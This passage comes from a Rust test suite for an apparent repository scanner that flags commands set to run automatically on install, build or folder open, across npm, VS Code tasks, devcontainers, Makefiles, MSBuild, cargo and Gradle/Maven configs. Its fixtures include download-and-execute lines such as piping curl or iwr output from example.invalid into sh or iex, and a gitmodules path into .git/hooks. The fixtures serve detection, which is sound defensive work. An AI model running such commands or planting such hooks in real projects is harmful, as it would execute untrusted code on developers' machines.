            bytes: text.as_bytes(),
            text: Some(text),
            kind: FileKind::Config,
            truncated: false,
        }
    }

    fn run(path: &str, text: &str) -> (Vec<Surface>, Vec<Finding>) {
        let mut out = Vec::new();
        let found = surfaces(&ctx(path, text), &mut out);
        (found, out)
    }

    fn commands(s: &[Surface]) -> Vec<&str> {
        s.iter().map(|x| x.command.as_str()).collect()
    }

    fn lines(s: &[Surface]) -> Vec<usize> {
        s.iter().map(|x| x.line).collect()
    }

    fn rules(out: &[Finding]) -> Vec<&str> {
        out.iter().map(|f| f.rule.as_str()).collect()
    }

    fn named<'a>(out: &'a [Finding], rule: &str) -> &'a Finding {
        out.iter()
            .find(|f| f.rule == rule)
            .unwrap_or_else(|| panic!("no {rule} in {:?}", rules(out)))
    }

    /// Every surface has this rule, trigger and floor.
    fn all_are(s: &[Surface], rule: &str, trigger: Trigger, floor: Severity) {
        assert!(!s.is_empty(), "no surfaces");
        for x in s {
            assert_eq!(
                (x.rule, x.trigger, x.floor),
                (rule, trigger, floor),
                "{x:?}"
            );
        }
    }

    // package.json

    const LIFECYCLE: &str = r#"{
  "name": "x",
  "scripts": {
    "build": "tsc",
    "preinstall": "node pre.js",
    "install": "node-gyp rebuild",
    "postinstall": "node post.js"
  }
}"#;

    #[test]
    fn npm_install_lifecycle_scripts_are_install_surfaces() {
        let (s, out) = run("package.json", LIFECYCLE);
        assert_eq!(
            commands(&s),
            ["node pre.js", "node-gyp rebuild", "node post.js"]
        );
        all_are(
            &s,
            "autorun.npm-lifecycle",
            Trigger::Install,
            Severity::Info,
        );
        assert_eq!(lines(&s), [5, 6, 7]);
        assert!(
            s.iter()
                .all(|x| x.path == "package.json" && x.dir.is_empty())
        );
        // One INFO inventory finding for the file, nothing else.
        assert_eq!(rules(&out), ["autorun.inventory"]);
        let inv = &out[0];
        assert_eq!(
            (inv.severity, inv.group, inv.line, inv.count),
            (Severity::Info, Group::Autorun, 0, 3)
        );
        assert_eq!(inv.path, "package.json");
    }

    #[test]
    fn npm_prepare_prepublish_and_prepack_are_build_surfaces() {
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"prepare":"husky install","prepublish":"npm run build","prepack":"node pack.js","prepublishOnly":"node x.js"}}"#,
        );
        assert_eq!(
            commands(&s),
            ["husky install", "npm run build", "node pack.js"]
        );
        all_are(&s, "autorun.npm-lifecycle", Trigger::Build, Severity::Info);
    }

    #[test]
    fn npm_ordinary_scripts_are_not_surfaces() {
        let (s, out) = run(
            "package.json",
            r#"{"scripts":{"build":"tsc","test":"jest","lint":"eslint .","start":"node server.js","dev":"vite","pretest":"node a.js","postbuild":"node b.js"}}"#,
        );
        assert!(s.is_empty(), "{s:?}");
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn npm_start_that_runs_a_data_file_is_a_high_floor_surface() {
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"start":"node public/fonts/a.woff2","dev":"npm run serve","serve":"node assets/logo.png"}}"#,
        );
        assert_eq!(commands(&s), ["node public/fonts/a.woff2", "npm run serve"]);
        all_are(&s, "autorun.npm-start-data", Trigger::OptIn, Severity::High);
    }

    #[test]
    fn package_json_at_depth_names_its_folder_and_node_modules_is_skipped() {
        let (s, _) = run("packages/a/package.json", LIFECYCLE);
        assert!(s.iter().all(|x| x.dir == "packages/a"), "{s:?}");
        for path in [
            "node_modules/x/package.json",
            "a/node_modules/x/package.json",
        ] {
            let (s, out) = run(path, LIFECYCLE);
            assert!(s.is_empty() && out.is_empty(), "{path}");
        }
    }

    #[test]
    fn package_json_that_is_not_json_is_high() {
        let (s, out) = run("package.json", r#"{"scripts": {"postinstall": "#);
        assert!(s.is_empty());
        assert_eq!(rules(&out), ["autorun.unparsed"]);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn npm_scripts_lists_names_and_commands() {
        let f = ctx(
            "package.json",
            r#"{"scripts":{"build":"tsc","n":3,"postinstall":"node a.js"}}"#,
        );
        assert_eq!(
            npm_scripts(&f),
            [
                ("build".to_string(), "tsc".to_string()),
                ("postinstall".to_string(), "node a.js".to_string())
            ]
        );
        assert!(npm_scripts(&ctx("package.json", r#"{"name":"x"}"#)).is_empty());
        assert!(npm_scripts(&ctx("package.json", "not json")).is_empty());
    }

    // .vscode/tasks.json and .cursor/tasks.json

    const TASKS: &str = r#"{
  // runs when the folder opens
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "node",
      "args": ["scripts/setup.js", "--quiet"],
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never", "echo": false },
    },
    { "label": "build", "type": "shell", "command": "make" }
  ]
}"#;

    #[test]
    fn a_folder_open_task_is_an_open_surface() {
        let (s, out) = run(".vscode/tasks.json", TASKS);
        assert_eq!(commands(&s), ["node scripts/setup.js --quiet"]);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].path, ".vscode/tasks.json");
        assert_eq!(s[0].line, 8);
        assert_eq!(s[0].dir, "");
        // A task that hides its output says so in the file's finding.
        assert!(
            named(&out, "autorun.inventory")
                .why
                .contains("reveal never")
        );
    }

    #[test]
    fn a_task_that_shows_its_output_adds_no_hidden_note() {
        let (_, out) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[{"label":"a","command":"npm run watch","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"always"}}]}"#,
        );
        assert!(
            !named(&out, "autorun.inventory")
                .why
                .contains("reveal never")
        );
    }

    #[test]
    fn vscode_repo_watch_task_is_medium_not_high() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"version":"2.0.0","tasks":[{"label":"watch","type":"npm","script":"watch","isBackground":true,"runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(commands(&s), ["npm run watch"]);
        let shape = shape::classify(&s[0].command);
        let level = shape::severity(s[0].trigger, shape, None).max(s[0].floor);
        assert_eq!(level, Severity::Medium);
    }

    #[test]
    fn tasks_that_do_not_run_on_folder_open_are_not_surfaces() {
        let (s, out) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[{"label":"a","command":"make","runOptions":{"runOn":"default"}},{"label":"b","command":"make","runOptions":{"reevaluateOnRerun":true}},{"label":"c","command":"make"}]}"#,
        );
        assert!(s.is_empty() && out.is_empty(), "{s:?} {out:?}");
    }

    #[test]
    fn a_folder_open_task_runs_what_it_depends_on_and_what_its_platforms_override() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[
  {"label":"boot","dependsOn":["fetch","boot"],"runOptions":{"runOn":"folderOpen"}},
  {"label":"fetch","type":"shell","command":"curl -s https://example.invalid/x | sh",
   "windows":{"command":"powershell","args":["-c","iwr https://example.invalid/x | iex"]}}
]}"#,
        );
        assert_eq!(
            commands(&s),
            [
                "curl -s https://example.invalid/x | sh",
                "powershell -c \"iwr https://example.invalid/x | iex\""
            ]
        );
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
    }

    #[test]
    fn cursor_tasks_and_nested_folders_count_too() {
        let (s, _) = run(
            "app/.cursor/tasks.json",
            r#"{"tasks":[{"label":"a","command":{"value":"node"},"args":[{"value":"a.js","quoting":"strong"}],"runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(s[0].dir, "app");
        // A tasks.json outside an editor folder is not read.
        let (s, out) = run("docs/tasks.json", TASKS);
        assert!(s.is_empty() && out.is_empty());
    }

    #[test]
    fn a_tasks_file_the_parser_rejects_is_reported() {
        let (s, out) = run(".vscode/tasks.json", r#"{"tasks": ["#);
        assert!(s.is_empty());
        let f = named(&out, "autorun.unparsed");
        assert_eq!(
            (f.severity, f.path.as_str()),
            (Severity::High, ".vscode/tasks.json")
        );
    }

    // devcontainer

    #[test]
    fn initialize_command_runs_on_the_host() {
        let (s, _) = run(
            ".devcontainer/devcontainer.json",
            r#"{
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
  "features": { "ghcr.io/devcontainers/features/node:1": {} },
  "initializeCommand": "echo hi",
  "postCreateCommand": "npm install"
}"#,
        );
        assert_eq!(commands(&s), ["echo hi"]);
        all_are(
            &s,
            "autorun.devcontainer-host",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].line, 4);
    }

    #[test]
    fn initialize_command_takes_a_string_an_array_or_an_object() {
        let (s, _) = run(
            ".devcontainer.json",
            r#"{"initializeCommand":["node","my script.js"]}"#,
        );
        assert_eq!(commands(&s), ["node \"my script.js\""]);
        let (s, _) = run(
            ".devcontainer/web/devcontainer.json",
            r#"{"initializeCommand":{"a":"node a.js","b":["node","b.js"]}}"#,
        );
        assert_eq!(commands(&s), ["node a.js", "node b.js"]);
        let (s, out) = run(".devcontainer/devcontainer.json", r#"{"image":"x"}"#);
        assert!(s.is_empty() && out.is_empty());
        // A devcontainer.json elsewhere is not a devcontainer.
        let (s, _) = run("docs/devcontainer.json", r#"{"initializeCommand":"x"}"#);
        assert!(s.is_empty());
    }

    #[test]
    fn a_devcontainer_the_parser_rejects_is_reported() {
        let (_, out) = run(".devcontainer.json", "{ initializeCommand }");
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn privileged_containers_are_medium() {
        for text in [
            r#"{"privileged": true}"#,
            r#"{"mounts":["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"]}"#,
            r#"{"mounts":[{"source":"/var/run/docker.sock","target":"/x","type":"bind"}]}"#,
            r#"{"capAdd":["NET_ADMIN","SYS_ADMIN"]}"#,
            r#"{"runArgs":["--privileged"]}"#,
        ] {
            let (s, out) = run(".devcontainer/devcontainer.json", text);
            assert!(s.is_empty());
            let f = named(&out, "autorun.devcontainer-privileged");
            assert_eq!(f.severity, Severity::Medium, "{text}");
            assert_eq!(f.group, Group::Autorun);
        }
    }

    #[test]
    fn unprivileged_containers_are_not_flagged() {
        let (_, out) = run(
            ".devcontainer/devcontainer.json",
            r#"{"privileged":false,"capAdd":["NET_ADMIN"],"mounts":["source=cache,target=/cache,type=volume"],"runArgs":["--init"]}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    // Makefile, *.mk, *.m4, configure

    #[test]
    fn a_makefile_line_that_downloads_and_runs_is_a_build_surface() {
        let mk = "all:\n\tgcc -o a a.c\n\t# curl https://example.invalid/x | sh\n# curl https://example.invalid/y | sh\nfetch:\n\t@curl -fsSL https://example.invalid/i.sh | sh\n\tcurl -O https://example.invalid/data.tgz\n";
        let (s, _) = run("Makefile", mk);
        assert_eq!(
            commands(&s),
            ["curl -fsSL https://example.invalid/i.sh | sh"]
        );
        all_are(&s, "autorun.build-script", Trigger::Build, Severity::Info);
        assert_eq!(lines(&s), [6]);
    }

    #[test]
    fn a_continued_makefile_line_is_one_command() {
        let mk = "x:\n\tcurl -fsSL https://example.invalid/i.sh \\\n\t  | sh\n";
        let (s, _) = run("sub/Makefile", mk);
        assert_eq!(
            commands(&s),
            ["curl -fsSL https://example.invalid/i.sh | sh"]
        );
        assert_eq!((s[0].line, s[0].dir.as_str()), (2, "sub"));
    }

    #[test]
    fn m4_mk_and_configure_files_are_read_the_same_way() {
        let body = "AC_DEFUN([X],[\n  xz -dc payload.xz | /bin/sh\n])\n";
        for path in ["m4/build.m4", "rules.mk", "configure"] {
            let (s, _) = run(path, body);
            assert_eq!(commands(&s), ["xz -dc payload.xz | /bin/sh"], "{path}");
            assert_eq!(s[0].rule, "autorun.build-script");
        }
        // `dnl` starts a comment in m4 only.
        let dnl = "dnl curl https://example.invalid/x | sh\n";
        assert!(run("m4/build.m4", dnl).0.is_empty());
        assert_eq!(run("rules.mk", dnl).0.len(), 1);
    }

    #[test]
    fn plain_and_network_only_build_lines_are_not_surfaces() {
        let mk =
            "all:\n\tgcc -o a a.c\n\tcurl -O https://example.invalid/data.tgz\n\tnpx prettier .\n";
        let (s, out) = run("Makefile", mk);
        assert!(s.is_empty() && out.is_empty());
        // A file that is not a build file is not read.
        let (s, _) = run("notes.txt", "curl https://example.invalid/x | sh\n");
        assert!(s.is_empty());
        let (s, _) = run("Makefile.am", "curl https://example.invalid/x | sh\n");
        assert!(s.is_empty());
    }

    // .envrc, .pre-commit-config.yaml, .husky, Justfile, Taskfile.yml

    #[test]
    fn envrc_lines_are_opt_in_surfaces() {
        let (s, _) = run(
            "app/.envrc",
            "# comment\nuse flake\nexport TOKEN=abc\ncurl https://example.invalid/x | sh\n",
        );
        assert_eq!(
            commands(&s),
            [
                "use flake",
                "export TOKEN=abc",
                "curl https://example.invalid/x | sh"
            ]
        );
        all_are(&s, "autorun.envrc", Trigger::OptIn, Severity::Info);
        assert_eq!((lines(&s), s[0].dir.as_str()), (vec![2, 3, 4], "app"));
        let (s, out) = run(".envrc", "# nothing here\n\n");
        assert!(s.is_empty() && out.is_empty());
    }

    const PRE_COMMIT: &str = "repos:
  - repo: local
    hooks:
      - id: lint
        name: lint
        entry: ./scripts/lint.sh --fix
        language: system
        files: \\.py$
      - id: fmt
        name: fmt
        language: python
        entry: black
      - id: gen
        language: 'system'
        entry: \"node gen.js\"
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-yaml
";

    #[test]
    fn pre_commit_entries_with_language_system_are_opt_in_surfaces() {
        let (s, _) = run(".pre-commit-config.yaml", PRE_COMMIT);
        assert_eq!(commands(&s), ["./scripts/lint.sh --fix", "node gen.js"]);
        all_are(
            &s,
            "autorun.pre-commit-hook",
            Trigger::OptIn,
            Severity::Info,
        );
        assert_eq!(lines(&s), [6, 15]);
    }

    #[test]
    fn pre_commit_hooks_in_other_languages_are_not_surfaces() {
        let (s, out) = run(
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: fmt\n        language: python\n        entry: black\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    #[test]
    fn husky_hook_lines_are_opt_in_surfaces() {
        let (s, _) = run(
            ".husky/pre-commit",
            "#!/usr/bin/env sh\n. \"$(dirname -- \"$0\")/_/husky.sh\"\n\nnpx lint-staged\n",
        );
        assert_eq!(
            commands(&s),
            [". \"$(dirname -- \"$0\")/_/husky.sh\"", "npx lint-staged"]
        );
        all_are(&s, "autorun.husky-hook", Trigger::OptIn, Severity::Info);
        assert_eq!(lines(&s), [2, 4]);
        let (s, _) = run("app/.husky/pre-push", "npm test\n");
        assert_eq!((commands(&s), s[0].dir.as_str()), (vec!["npm test"], "app"));
    }

    #[test]
    fn husky_generated_helpers_are_not_hooks() {
        let (s, out) = run(".husky/_/husky.sh", "echo helper\n");
        assert!(s.is_empty() && out.is_empty());
        let (s, _) = run("husky/pre-commit", "npm test\n");
        assert!(s.is_empty());
    }

    #[test]
    fn justfile_recipe_lines_are_opt_in_surfaces() {
        let jf = "set shell := [\"bash\", \"-c\"]\nversion := \"1.0\"\n\nbuild:\n    cargo build --release\n\nfetch: build\n    @curl -fsSL https://example.invalid/i.sh | sh\n    # a comment\n";
        for path in ["Justfile", "justfile", ".justfile"] {
            let (s, _) = run(path, jf);
            assert_eq!(
                commands(&s),
                [
                    "cargo build --release",
                    "curl -fsSL https://example.invalid/i.sh | sh"
                ],
                "{path}"
            );
            all_are(&s, "autorun.justfile", Trigger::OptIn, Severity::Info);
            assert_eq!(lines(&s), [5, 8]);
        }
        let (s, out) = run(
            "Justfile",
            "set shell := [\"bash\"]\nx := \"1\"\nall: build\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    const TASKFILE: &str = "version: '3'
tasks:
  build:
    cmds:
      - go build ./...
      - cmd: ./gen.sh
      - task: other
      - |
        curl -fsSL https://example.invalid/i.sh | sh
        echo done
  lint:
    cmd: golangci-lint run
  deps-only:
    deps: [build]
    desc: \"say cmd: x\"
";

    #[test]
    fn taskfile_commands_are_opt_in_surfaces() {
        let (s, _) = run("Taskfile.yml", TASKFILE);
        assert_eq!(
            commands(&s),
            [
                "go build ./...",
                "./gen.sh",
                "curl -fsSL https://example.invalid/i.sh | sh",
                "echo done",
                "golangci-lint run"
            ]
        );
        all_are(&s, "autorun.taskfile", Trigger::OptIn, Severity::Info);
        let mut sorted = lines(&s);
        sorted.sort_unstable();
        assert_eq!(sorted, [5, 6, 9, 10, 12]);
        let (s, _) = run("sub/taskfile.yaml", "tasks:\n  a:\n    cmd: make\n");
        assert_eq!((commands(&s), s[0].dir.as_str()), (vec!["make"], "sub"));
        let (s, out) = run(
            "Taskfile.yml",
            "version: '3'\ntasks:\n  a:\n    deps: [b]\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    // MSBuild

    const CSPROJ: &str = r#"<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="Gen" BeforeTargets="Build">
    <Exec Command="dotnet tool run gen &amp;&amp; echo ok" />
    <Exec WorkingDirectory="x" Condition="'$(A)' &gt; '1'" Command='curl -s https://example.invalid/i.sh | sh' />
  </Target>
  <PropertyGroup>
    <PreBuildEvent>node prebuild.js
call post.bat</PreBuildEvent>
    <PostBuildEvent>echo done</PostBuildEvent>
  </PropertyGroup>
</Project>"#;

    #[test]
    fn msbuild_exec_and_build_events_are_build_surfaces() {
        for path in ["app/App.csproj", "Directory.Build.props", "build/x.targets"] {
            let (s, _) = run(path, CSPROJ);
            assert_eq!(
                commands(&s),
                [
                    "dotnet tool run gen && echo ok",
                    "curl -s https://example.invalid/i.sh | sh",
                    "node prebuild.js",
                    "call post.bat",
                    "echo done"
                ],
                "{path}"
            );
            all_are(&s, "autorun.msbuild-exec", Trigger::Build, Severity::Info);
        }
        let (s, _) = run("app/App.csproj", CSPROJ);
        assert_eq!(lines(&s), [3, 4, 7, 8, 9]);
        assert_eq!(s[0].dir, "app");
    }

    #[test]
    fn a_project_file_without_commands_is_not_a_surface() {
        let (s, out) = run(
            "App.csproj",
            r#"<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><Target Name="x"><Message Text="hi" /></Target></Project>"#,
        );
        assert!(s.is_empty() && out.is_empty());
        let (s, _) = run("App.xml", CSPROJ);
        assert!(s.is_empty());
    }

    // Python and Rust build hooks

    #[test]
    fn setup_py_cmdclass_that_overrides_install_is_medium() {
        let src = "from setuptools import setup\nfrom setuptools.command.install import install\nclass Evil(install):\n    def run(self):\n        pass\nsetup(name='x', cmdclass={'build_ext': B, 'install': Evil})\n";
        let (_, out) = run("setup.py", src);
        let f = named(&out, "autorun.setup-py-cmdclass");
        assert_eq!(
            (f.severity, f.line, f.group),
            (Severity::Medium, 6, Group::Autorun)
        );
        for src in [
            "setup(cmdclass=dict(develop=X))\n",
            "cmdclass = {}\ncmdclass['egg_info'] = X\nsetup(cmdclass=cmdclass)\n",
            "setup(\n    cmdclass={\n        \"egg_info\": X,\n    },\n)\n",
        ] {
            let (_, out) = run("pkg/setup.py", src);
            assert!(rules(&out).contains(&"autorun.setup-py-cmdclass"), "{src}");
        }
    }

    #[test]
    fn setup_py_always_runs_when_the_package_installs() {
        // With or without a cmdclass: a surface the orchestrator rates, so a HIGH finding in
        // setup.py reaches CRITICAL. The command names the file for `files_run`.
        for (path, src, dir) in [
            ("setup.py", "setup(name='x')\n", ""),
            ("pkg/setup.py", "setup(cmdclass={'install': X})\n", "pkg"),
        ] {
            let (s, _) = run(path, src);
            assert_eq!(commands(&s), ["python setup.py"], "{path}");
            all_are(&s, "autorun.setup-py", Trigger::Install, Severity::Info);
            assert_eq!((s[0].path.as_str(), s[0].dir.as_str()), (path, dir));
            assert_eq!(shape::files_run(&s[0].command), ["setup.py"]);
        }
        let (s, _) = run("docs/setup.txt", "setup(name='x')\n");
        assert!(s.is_empty());
    }

    #[test]
    fn setup_py_without_an_overriding_cmdclass_is_clean() {
        for src in [
            "setup(name='x')\n",
            "setup(name='x', cmdclass={'build_ext': build_ext})\n",
            "setup(name='x', cmdclass=dict(build_py=B))\n",
            "# cmdclass is not used\nsetup(name='install')\n",
        ] {
            let (_, out) = run("setup.py", src);
            assert!(!rules(&out).contains(&"autorun.setup-py-cmdclass"), "{src}");
        }
    }

    #[test]
    fn pyproject_backend_path_is_medium() {
        let src = "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"backend\"\nbackend-path = [\"_build\"]\n";
        let (_, out) = run("pyproject.toml", src);
        let f = named(&out, "autorun.pyproject-backend-path");
        assert_eq!((f.severity, f.line), (Severity::Medium, 4));
    }

    #[test]
    fn a_pyproject_with_a_published_backend_is_clean() {
        let (_, out) = run(
            "pyproject.toml",
            "[project]\nname = \"flask\"\n\n[build-system]\nrequires = [\"flit_core<4\"]\nbuild-backend = \"flit_core.buildapi\"\n\n[tool.x]\nbackend-path = \"y\"\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn build_rs_is_an_info_finding() {
        for path in ["build.rs", "crates/x/build.rs"] {
            let (s, out) = run(path, "fn main() {}\n");
            assert!(s.is_empty());
            let f = named(&out, "autorun.build-rs");
            assert_eq!(
                (f.severity, f.path.as_str(), f.line),
                (Severity::Info, path, 0)
            );
        }
        for path in ["src/rebuild.rs", "build.rs.bak", "build.rss"] {
            let (_, out) = run(path, "fn main() {}\n");
            assert!(out.is_empty(), "{path}");
        }
    }

    #[test]
    fn cargo_config_that_names_a_program_is_high() {
        for (text, line) in [
            ("[build]\nrustc-wrapper = \"./w.sh\"\n", 2),
            ("[build]\njobs = 4\nrustc = \"./rustc\"\n", 3),
            ("[build]\nrustc-workspace-wrapper = \"tools/x\"\n", 2),
            (
                "[target.x86_64-unknown-linux-gnu]\nrunner = \"./run.sh\"\n",
                2,
            ),
            ("[target.'cfg(unix)']\nrunner = [\"./run.sh\"]\n", 2),
            ("build.rustc-wrapper = \"./x\"\n", 1),
        ] {
            for path in [
                ".cargo/config.toml",
                ".cargo/config",
                "app/.cargo/config.toml",
            ] {
                let (s, out) = run(path, text);
                assert!(s.is_empty());
                let f = named(&out, "autorun.cargo-config");
                assert_eq!((f.severity, f.line), (Severity::High, line), "{text}");
            }
        }
    }

    #[test]
    fn cargo_config_that_names_an_installed_program_is_medium() {
        // A bare name is found on PATH, not in the repo: sccache and test runners.
        for text in [
            "[build]\nrustc-wrapper = \"sccache\"\n",
            "[build]\nrustc-workspace-wrapper = 'sccache'\n",
            "[target.thumbv7em-none-eabihf]\nrunner = \"probe-rs run --chip nRF52840\"\n",
            "[target.wasm32-unknown-unknown]\nrunner = [\"wasmtime\", \"--dir=.\"]\n",
            "[target.'cfg(all())']\nrunner = \"wasm-bindgen-test-runner\"\n",
        ] {
            let (_, out) = run(".cargo/config.toml", text);
            assert_eq!(
                named(&out, "autorun.cargo-config").severity,
                Severity::Medium,
                "{text}"
            );
        }
        // A path into the repo, or a bare name with a path argument first, is repo code.
        let (_, out) = run(
            ".cargo/config.toml",
            "[build]\nrustc-wrapper = \"./sccache\"\n",
        );
        assert_eq!(named(&out, "autorun.cargo-config").severity, Severity::High);
    }

    #[test]
    fn cargo_config_env_and_source_tables_are_medium() {
        for text in [
            "[env]\nFOO = \"bar\"\n",
            "[env.FOO]\nvalue = \"bar\"\n",
            "[source.crates-io]\nreplace-with = \"vendored\"\n",
            "[source.vendored]\ndirectory = \"vendor\"\n",
        ] {
            let (_, out) = run(".cargo/config.toml", text);
            assert_eq!(
                named(&out, "autorun.cargo-config").severity,
                Severity::Medium,
                "{text}"
            );
        }
        // The strongest entry sets the level.
        let (_, out) = run(
            ".cargo/config.toml",
            "[env]\nA = \"1\"\n[build]\nrustc = \"./x\"\n",
        );
        assert_eq!(rules(&out), ["autorun.cargo-config"]);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn plain_cargo_config_is_clean() {
        let (_, out) = run(
            ".cargo/config.toml",
            "[build]\njobs = 4\n[alias]\nrunner = \"run --release\"\nb = \"build\"\n[term]\nverbose = true\n",
        );
        assert!(out.is_empty(), "{out:?}");
        let (_, out) = run("config.toml", "[build]\nrustc = \"x\"\n");
        assert!(out.is_empty());
    }

    #[test]
    fn rust_toolchain_path_is_high() {
        for path in [
            "rust-toolchain.toml",
            "rust-toolchain",
            "sub/rust-toolchain.toml",
        ] {
            let (_, out) = run(path, "[toolchain]\npath = \"./tc\"\n");
            let f = named(&out, "autorun.rust-toolchain-path");
            assert_eq!((f.severity, f.line), (Severity::High, 2), "{path}");
        }
        for text in ["[toolchain]\nchannel = \"1.80\"\n", "stable\n"] {
            let (_, out) = run("rust-toolchain.toml", text);
            assert!(out.is_empty(), "{text}");
        }
    }

    // Gradle and Maven wrappers

    #[test]
    fn gradle_wrapper_from_another_host_is_high() {
        for url in [
            r"https\://example.invalid/distributions/gradle-8.5-bin.zip",
            r"https\://services.gradle.org@example.invalid/g.zip",
            "http://example.invalid/g.zip",
            r"file\:///tmp/g.zip",
        ] {
            let text = format!("distributionBase=GRADLE_USER_HOME\ndistributionUrl={url}\n");
            for path in [
                "gradle/wrapper/gradle-wrapper.properties",
                "app/gradle/wrapper/gradle-wrapper.properties",
            ] {
                let (_, out) = run(path, &text);
                let f = named(&out, "autorun.gradle-wrapper");
                assert_eq!((f.severity, f.line), (Severity::High, 2), "{url}");
            }
        }
    }

    #[test]
    fn gradle_wrapper_from_the_official_host_is_clean() {
        for url in [
            r"https\://services.gradle.org/distributions/gradle-8.5-bin.zip",
            "https://services.gradle.org/distributions/gradle-8.5-bin.zip",
            r"https\://SERVICES.GRADLE.ORG:443/distributions/gradle-8.5-bin.zip",
            r"https\://user:pw@services.gradle.org/distributions/gradle-8.5-bin.zip",
        ] {
            let text = format!("distributionUrl={url}\nzipStoreBase=GRADLE_USER_HOME\n");
            let (_, out) = run("gradle/wrapper/gradle-wrapper.properties", &text);
            assert!(out.is_empty(), "{url}: {out:?}");
        }
        let (_, out) = run(
            "gradle.properties",
            "distributionUrl=https://example.invalid/x\n",
        );
        assert!(out.is_empty());
    }

    #[test]
    fn a_gradle_wrapper_jar_is_info_even_when_it_is_not_text() {
        let f = FileCtx {
            path: "gradle/wrapper/gradle-wrapper.jar",
            bytes: b"PK\x03\x04",
            text: None,
            kind: FileKind::Binary,
            truncated: false,
        };
        let mut out = Vec::new();
        assert!(surfaces(&f, &mut out).is_empty());
        let found = named(&out, "autorun.gradle-wrapper");
        assert_eq!(
            (found.severity, found.path.as_str()),
            (Severity::Info, "gradle/wrapper/gradle-wrapper.jar")
        );
        let (_, out) = run("lib/gradle-wrapper.jar", "x");
        assert!(out.is_empty());
    }

    #[test]
    fn maven_extensions_are_medium() {
        let (_, out) = run(".mvn/extensions.xml", "<extensions/>");
        let f = named(&out, "autorun.maven-extensions");
        assert_eq!(
            (f.severity, f.path.as_str()),
            (Severity::Medium, ".mvn/extensions.xml")
        );
        let (_, out) = run("src/extensions.xml", "<extensions/>");
        assert!(out.is_empty());
    }

    #[test]
    fn maven_wrapper_from_another_host_is_high() {
        let text = "distributionUrl=https://repo.maven.apache.org/maven2/apache-maven-3.9.6-bin.zip\nwrapperUrl=https://example.invalid/maven-wrapper.jar\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        let f = named(&out, "autorun.maven-extensions");
        assert_eq!((f.severity, f.line), (Severity::High, 2));
        let text = "distributionUrl=https://example.invalid/apache-maven-3.9.6-bin.zip\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        assert_eq!(
            named(&out, "autorun.maven-extensions").severity,
            Severity::High
        );
    }

    #[test]
    fn maven_wrapper_from_the_official_host_is_clean() {
        let text = "distributionUrl=https://repo.maven.apache.org/maven2/apache-maven-3.9.6-bin.zip\nwrapperUrl=https://repo.maven.apache.org/maven2/maven-wrapper-3.2.0.jar\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        assert!(out.is_empty(), "{out:?}");
    }

    // VS Code settings

    #[test]
    fn settings_that_hide_the_vscode_folder_are_high() {
        for key in [".vscode", "**/.vscode", ".vscode/**", "**/.vscode/**"] {
            let text = format!("{{\"files.exclude\": {{\"**/.git\": true, \"{key}\": true}}}}");
            let (_, out) = run(".vscode/settings.json", &text);
            assert_eq!(
                named(&out, "autorun.vscode-hidden").severity,
                Severity::High,
                "{key}"
            );
        }
    }

    #[test]
    fn settings_that_hide_a_folder_that_only_starts_like_vscode_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"files.exclude": {".vscode-test": true, "**/.vscode-test/**": true, "**/.vscode-insiders": true, "x.vscode": true}}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn settings_that_hide_other_things_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"files.exclude": {"**/.git": true, "**/node_modules": true, "**/.vscode": false}, "editor.fontSize": 12}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn terminal_env_settings_are_medium() {
        let (_, out) = run(
            ".vscode/settings.json",
            "{\n  // comment\n  \"terminal.integrated.env.linux\": {\"NODE_OPTIONS\": \"--require ./x.js\"}\n}",
        );
        let f = named(&out, "autorun.vscode-env");
        assert_eq!((f.severity, f.line), (Severity::Medium, 3));
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"terminal.integrated.fontSize": 12}"#,
        );
        assert!(out.is_empty());
    }

    // git files

    #[test]
    fn a_gitmodules_file_with_a_cr_a_dotdot_or_a_bad_url_is_high() {
        for text in [
            "[submodule \"a\"]\n\tpath = deps/a\r\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = ../../.git/hooks\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = x/../y\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = http://example.invalid/a.git\n",
